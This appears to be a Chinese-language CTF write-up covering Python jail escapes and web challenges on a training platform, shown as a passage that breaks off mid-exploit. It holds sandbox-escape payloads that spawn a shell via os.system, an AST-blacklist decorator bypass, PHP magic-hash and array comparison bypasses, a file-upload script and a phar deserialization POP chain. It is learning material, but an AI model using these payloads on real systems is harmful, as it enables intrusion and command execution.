+<p>| |<em><strong>| |</strong></em>  \ V / | |<em><strong>| |</strong></em>  | (_) |</p>
+<p>|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|  ___/</p>
+<p>​</p>
+<p>‘’’</p>
+<p>print WELCOME</p>
+<p>print “Welcome to the python jail”</p>
+<p>print “This program will repeat your messages”</p>
+<p>input_data = input(&quot;&gt; &quot;)</p>
+<p>print input_data</p>
+<p>在Python 2.x版本中，可以使用print语句而不使用括号。例如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Hello, World!&quot;</span><br></code></pre></td></tr></table></figure>
+<p>但是，在Python 3.x及以上版本中，print被改为了一个函数，所以必须使用括号。因此，在Python 3.x及以上版本中，必须使用括号来调用print函数。例如：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello, World!&quot;</span>)</span></span><br></code></pre></td></tr></table></figure>
+<p>说明它是py2环境</p>
+<p>那么问题来了</p>
+<p>py2环境中明明没有input()用法</p>
+<p>为什么会出现input()</p>
+<p>应该是raw_input才对</p>
+<p>那py2里的input()是什么情况 什么用法?</p>
+<p>查官网文档</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101111153757.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><code>eval()</code>函数内处理的参数是字符串。</p>
+<p>raw_input把所有输入作为字符串看待 返回字符串类型</p>
+<p>**注意：**input() 和 raw_input() 这两个函数均能接收 字符串 ，但 raw_input()  直接读取控制台的输入（任何类型的输入它都可以接收）。而对于 input() ，它希望能够读取一个合法的 python  表达式，即你输入字符串的时候必须使用引号将它括起来，否则它会引发一个 SyntaxError 。</p>
+<p>input() 产生漏洞原因</p>
+<p>函数会将 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=stdin&amp;spm=1001.2101.3001.7020">stdin</a> 输入的内容当做是 python2 代码去执行</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101112344385.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>利用方式</p>
+<pre><code class="hljs">如果 python 脚本本身就有引入 os 库，输入 payload 直接 getshell：
+</code></pre>
+<p>os.system(‘/bin/sh’)</p>
+<pre><code class="hljs">1
+
+如果 python 脚本没有引入 os 库，payload 如下：
+</code></pre>
+<p><strong>import</strong>(‘os’).system(‘/bin/sh’)<br>
+直接当作py2代码执行了</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101112626332.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<hr>
+<h6 id="pyjail9">pyjail9</h6>
+<p>| |   | <em><strong><em>\ \   / / <strong><strong>| |      / _ \ <br>
+| |   |  <em>|  \ \ / /|  <em>| | |     | (</em>) |<br>
+| |</em></strong>| |</strong></em>  \ V / | |</strong></em>| |___   _<em>, |<br>
+|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>|    /</em>/</p>
+<p>=================================================================================================<br>
+==           Welcome to the JBNRZ’s pyjail level9,It’s AST challenge                       ==<br>
+==           Menu list:                                                                        ==<br>
+==             [G]et the blacklist AST                                                         ==<br>
+==             [E]xecute the python code                                                       ==</p>
+<p>==             [Q]uit jail challenge                                                           ==</p>
+<p>=================================================================================================</p>
+<p>G</p>
+<p>==        Black List AST:                                                                      ==<br>
+==                       'Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==</p>
+<p>==                        Sub,Mult,Div,Del’                                                    ==</p>
+<p>AST 沙箱会将用户的输入转化为操作码,此时字符串层面的变换基本上没用了,一般情况下考虑绕过 AST 黑名单.</p>
+<p>如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.</p>
+<p>装饰器</p>
+<p>利用 payload 如下:</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@exec</span><br><span class="hljs-variable">@input</span><br>class <span class="hljs-attribute">X</span>:<br>    pass<br></code></pre></td></tr></table></figure>
+<p>当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>@<span class="hljs-built_in">exec</span><br><span class="hljs-meta">... </span>@<span class="hljs-built_in">input</span><br><span class="hljs-meta">... </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">X</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">pass</span><br><span class="hljs-meta">... </span><br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;__main__.X&#x27;</span>&gt;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;ls&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.</p>
+<p>我是边学边打的</p>
+<p>我之前并不了解AST</p>
+<p>看到后没思路查了一下，</p>
+<p>看到总结如下：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647#toc-40">https://xz.aliyun.com/t/12647#toc-40</a></p>
+<p>![](file:///C:\Users\asus\Documents\Tencent Files\2104542143\nt_qq\nt_data\Pic\2024-01\Ori\952c7449fbc7c68b1193ced50bac7425.png)</p>
+<p>![](file:///C:\Users\asus\Documents\Tencent Files\2104542143\nt_qq\nt_data\Pic\2024-01\Ori\565b192695893e163e74af0916f9bfe9.png)</p>
+<h6 id="pyjail10">pyjail10</h6>
+<p>def repl():</p>
+<p>my_global_dict = dict()</p>
+<p>my_global_dict[‘flag’] = load_flag.get_flag()</p>
+<p>input_code = input(&quot;&gt; &quot;)</p>
+<p>complie_code = compile(input_code, ‘<string>’, ‘single’)</p>
+<p>exec(complie_code, my_global_dict)</p>
+<p>if <strong>name</strong> == ‘<strong>main</strong>’:</p>
+<p>main()</p>
+<p>我的好朋友GPT</p>
+<p>这段代码实现了一个简单的 REPL（Read-Eval-Print Loop）环境，其中：</p>
+<ol>
+<li><code>my_global_dict</code> 是一个包含全局变量的字典，<code>flag</code> 是其中一个变量，它的值是通过 <code>load_flag.get_flag()</code> 函数获取的。在 REPL 中输入的代码可以访问和修改这个字典中的变量。</li>
+<li><code>input_code</code> 用于接收用户输入的代码字符串。</li>
+<li><code>compile</code> 函数将 <code>input_code</code> 编译成可执行的字节码对象，<code>'&lt;string&gt;'</code> 参数表示编译的代码来自一个字符串，<code>'single'</code> 参数表示编译的代码只包含一条语句。</li>
+<li><code>exec</code> 函数执行编译后的字节码，并将结果保存在 <code>my_global_dict</code> 中。由于编译的代码只包含一条语句，因此每次执行的结果只会返回一行输出。</li>
+</ol>
+<p>这个 REPL 环境可以让用户输入 Python 代码，并立即执行。用户可以访问并修改 <code>my_global_dict</code> 中的变量，但需要注意不要修改敏感的变量或执行危险的操作，以免造成不必要的后果。</p>
+<p><code>dir()</code> 是 Python 内置函数，用于列出当前命名空间中的所有变量、函数和类等对象</p>
+<p>[‘<strong>builtins</strong>’, ‘flag’]</p>
+<p>在 Python 中，可以直接使用变量名来查看变量的值</p>
+<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">flag</span><br></code></pre></td></tr></table></figure>
+<p>&lt;load_flag.flag_level10 object at 0x7febd3722eb0&gt;</p>
+<p>使用内置函数 <code>dir()</code> 来列出对象的属性和方法，例如：</p>
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">dir</span>(flag)</span><br></code></pre></td></tr></table></figure>
+<p>这样可以帮助你了解 <code>flag</code> 对象的结构和可用的操作</p>
+<p>[‘<strong>class</strong>’, ‘<strong>delattr</strong>’, ‘<strong>dict</strong>’, ‘<strong>dir</strong>’, ‘<strong>doc</strong>’, ‘<strong>eq</strong>’, ‘<strong>format</strong>’, ‘<strong>ge</strong>’, ‘<strong>getattribute</strong>’, ‘<strong>gt</strong>’, ‘<strong>hash</strong>’, ‘<strong>init</strong>’, ‘<strong>init_subclass</strong>’, ‘<strong>le</strong>’, ‘<strong>lt</strong>’, ‘<strong>module</strong>’, ‘<strong>ne</strong>’, ‘<strong>new</strong>’, ‘<strong>reduce</strong>’, ‘<strong>reduce_ex</strong>’, ‘<strong>repr</strong>’, ‘<strong>setattr</strong>’, ‘<strong>sizeof</strong>’, ‘<strong>str</strong>’, ‘<strong>subclasshook</strong>’, ‘<strong>weakref</strong>’, ‘flag_level10’]</p>
+<p>这个输出意味着 flag 变量是一个对象</p>
+<p>你可以使用点运算符来访问这个属性的值，例如：</p>
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">flag.flag_level10</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>flag.flag_level10<br>
+DELETED</p>
+</blockquote>
+<p>?</p>
+<p>嘶</p>
+<p>不懂，但是它好像可以正常执行我的代码</p>
+<p>input_code = input(&quot;&gt; &quot;)</p>
+<p>complie_code = compile(input_code, ‘<string>’, ‘single’)</p>
+<p>exec(complie_code, my_global_dict)</p>
+<p>编译了也照样能执行呀</p>
+<p>这不有exec么</p>
+<p>那我直接一手breakpoint</p>
+<p>nc training.0rays.club 10077</p>
+<hr>
+<p>| |   | <em><em><strong>\ \   / / <em><strong><em>| |     / |/ _ \ <br>
+| |   |  <em>|  \ \ / /|  <em>| | |     | | | | |<br>
+| |</em></em></em>| |</strong></em>  \ V / | |</strong></em>| |</em>__  | | |<em>| |<br>
+|<em><strong><strong>|</strong></strong></em>|  _/  |<em><strong><strong>|</strong></strong></em>| |</em>|___/</p>
+<p>It’s so easy challenge!<br>
+Seems flag into the dir()</p>
+<blockquote>
+<p>breakpoint()<br>
+–Return–<br>
+<string>(1)<module>()-&gt;None<br>
+(Pdb) ls<br>
+*** NameError: name ‘ls’ is not defined<br>
+(Pdb) dir<br>
+<built-in function dir><br>
+(Pdb) <strong>import</strong>(“os”).system(“ls”)<br>
+bin<br>
+boot<br>
+dev<br>
+etc<br>
+flag<br>
+home<br>
+lib<br>
+lib32<br>
+lib64<br>
+libx32<br>
+media<br>
+mnt<br>
+opt<br>
+proc<br>
+root<br>
+run<br>
+sbin<br>
+srv<br>
+<a target="_blank" rel="noopener" href="http://start.sh">start.sh</a><br>
+sys<br>
+tmp<br>
+usr<br>
+var<br>
+0<br>
+(Pdb) cat flag<br>
+*** SyntaxError: invalid syntax<br>
+(Pdb) cat /flag<br>
+*** NameError: name ‘cat’ is not defined<br>
+(Pdb) <strong>import</strong>(“os”).system(“cat flag”)<br>
+CBCTF{30df3e3f-9fe5-4b4e-9824-fdf3a0885fae}<br>
+0<br>
+(Pdb)</p>
+</blockquote>
+<h5 id="WEB">WEB</h5>
+<h6 id="Another-Signin">Another_Signin</h6>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231011440323.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>HINT：域名、DNS和TXT</p>
+<ol>
+<li>DNS解析：使用 DNS 工具（例如<code>nslookup</code>或<code>dig</code>），查找该域名的 DNS 记录。运行以下命令：<code>nslookup game.0rays.club</code> 或 <code>dig game.0rays.club</code>。这将返回与该域名相关的记录，包括 IP 地址、NS（Name Servers）和其他记录。</li>
+<li>TXT记录：检查域名的 TXT 记录。运行以下命令：<code>nslookup -type=TXT game.0rays.club</code> 或 <code>dig TXT game.0rays.club</code>。这将显示与该域名相关的任何 TXT 记录。TXT 记录通常用于存储文本信息。</li>
+</ol>
+<h6 id="beginnerTETRis">beginnerTETRis</h6>
+<p>看js 审计</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230094016989.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231230094025074.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>两段base</p>
+<p>一把梭 拼起来</p>
+<p>解密得flag</p>
+<h6 id="ezphp">ezphp</h6>
+<p>The page you visit not found.</p>
+<p>Sorry, the page you are looking for is currently unavailable.<br>
+Please try again later.</p>
+<p>The server is powered by <a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a>.</p>
+<p><em>Faithfully yours, frp.</em></p>
+<p>​                              弱口令饶弱比较   再数组绕过array弱比较</p>
+<p>?orz=1&amp;jbn1=QNKCDZO&amp;jbn2=240610708&amp;username=0rays&amp;password=Array[]</p>
+<p>数组绕过</p>
+<p>?orz=1&amp;jbn1=QNKCDZO&amp;jbn2=240610708&amp;username=0rays&amp;password[]=Array</p>
+<p>自己写上传脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://2e4fa042-edc8-465d-aa17-f1706abbc8ab.training.0rays.club:8001/&#x27;</span> <br><br><span class="hljs-comment">#file_path = &#x27;D:\skyDownloads\Software\skysoftware\Orays\Web\SkyScript\图片马\Ak.jpg&#x27;#upload/20231231063324776.jpg</span><br>file_path = <span class="hljs-string">&#x27;D:\skyDownloads\Software\skysoftware\Orays\Web\SkyScript\反序列化\phar反序列化\phar.jpg&#x27;</span>  <br><span class="hljs-comment">#file_path = &#x27;D:\skyDownloads\Software\skysoftware\Orays\Web\SkyScript\文件马\post.php.jpg&#x27;#upload/20231231070253652.jpg</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: file&#125;<br>    response = requests.post(url, files=files)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;文件上传成功！&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;服务器返回的响应结果：&#x27;</span>, response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;文件上传失败！&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错误信息：&#x27;</span>, response.text)<br></code></pre></td></tr></table></figure>
+<p>PS C:\Users\asus&gt; python -u “d:\skyDownloads\Software\skysoftware\Orays\python\sky脚本\文件上传\upload.py”<br>
+文件上传成功！<br>
+服务器返回的响应结果： success save in: upload/20231231004401117.jpg</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231084554889.png" srcset="/img/loading.gif" lazyload alt="image-20231231084554889"></p>
+<p>接下来能上传了，上传的问题解决后我们再看其它的办法</p>
+<p>因为后台过滤比较严格，只能传图片，这就意味着普通的文件马上传了也打不了，但是图片马经过文件包含函数后是可以利用的</p>
+<p>这里看到下面的  include($this-&gt;checkAccess);  那肯定是要构造一下，然后把我们上传的图片马包含进去解析执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Act</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$checkAccess</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$id</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;  <br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;id !== <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;id !== <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">switch</span>(<span class="hljs-variable language_">$this</span>-&gt;id) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;checkAccess) &#123;<br>                        <br>                        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;checkAccess);<br>                       <span class="hljs-comment">//看这个  文件包含</span><br>                    &#125;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;id invalid in &quot;</span>.<span class="hljs-keyword">__CLASS__</span>.<span class="hljs-keyword">__FUNCTION__</span>);<br>                 <span class="hljs-comment">//   抛出新的异常</span><br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">break</span>;         <br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Con</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$formatters</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$providers</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>        &#125;<br>    <br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;providers <span class="hljs-keyword">as</span> <span class="hljs-variable">$provider</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>)) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\InvalidArgumentException</span>(<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="hljs-variable">$formatter</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFormatter</span>(<span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mmm</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;hello.php&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jbn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$reader</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|phar|http|file|ftp|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;invalid protocol found in &#x27;</span>.<span class="hljs-keyword">__CLASS__</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <br>        <br>        <span class="hljs-variable language_">$this</span>-&gt;str-&gt;<span class="hljs-title function_ invoke__">reset</span>();<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;reader !== <span class="hljs-literal">null</span>) &#123;<br>            <br>            <br>            <span class="hljs-variable language_">$this</span>-&gt;reader-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>继续看</p>
+<p>看到</p>
+<p>file_exists(fpath)</p>
+<p>这个可以触发phar反序列化</p>
+<p>phar文件，打开该文件可以看到文件头是<code>&lt;?php __halt_compiler(); ?&gt;</code>以及中间的部分内容是序列化的形式存在于这个文件中。</p>
+<p><img src="https://image.3001.net/images/20211119/1637308825_619759992d43a3b586529.png!small" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化于是存在反序列化漏洞 详细原理：<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
+<p>该方法在文件系统函数（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合phar://伪协议，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
+<p>那反序列化这就简单了，继续看</p>
+<ol>
+<li><code>Act</code> 类：可以用于处理文件上传的逻辑。你可以在 <code>run()</code> 方法中编写处理上传文件的代码。根据 <code>$id</code> 的不同值，你可以执行不同的操作，比如检查用户权限、验证文件类型和大小等。</li>
+<li><code>Con</code> 类：可以用于处理文件的格式化和转换操作。你可以定义不同的格式化器（如图片压缩、文件转换）作为 <code>$providers</code> 数组的元素，并使用 <code>getFormatter()</code> 方法获取特定的格式化器来处理用户上传的文件。</li>
+<li><code>Mmm</code> 类：可以用于处理文件上传成功后的操作。你可以在 <code>__invoke()</code> 方法中编写上传成功后的逻辑，比如生成缩略图、发送通知等。你可以在上传文件成功后创建一个 <code>Mmm</code> 对象并执行它，以触发后续操作。</li>
+<li><code>Jbn</code> 类：可以用于处理文件的读取和关闭操作。你可以在 <code>__construct()</code> 方法中传入上传的文件路径，然后在 <code>reset()</code> 方法中关闭文件读取器，以确保文件资源得到正确释放。</li>
+</ol>
+<p>pop链</p>
+<p>__wakeup</p>
+<p>toString<br>
+reset<br>
+__call<br>
+getFormatter<br>
+run</p>
+<ol>
+<li>反序列化，调jbn类 <code>__wakeup()</code></li>
+<li>对象转换字符串，调用 jbn 中 <code>__toString()</code></li>
+<li>reset重置。</li>
+<li>在 <code>Con</code> 类中，调 <code>__call()</code>，调 <code>getFormatter()</code></li>
+<li><code>getFormatter()</code> 方法返回格式化器，格式化数据</li>
+<li><code>Act </code>中run()` 执行</li>
+</ol>
+<p>switch可以弱比较绕过</p>
+<p>构造exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Act</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$checkAccess</span>;<br>    <span class="hljs-keyword">protected</span> <span 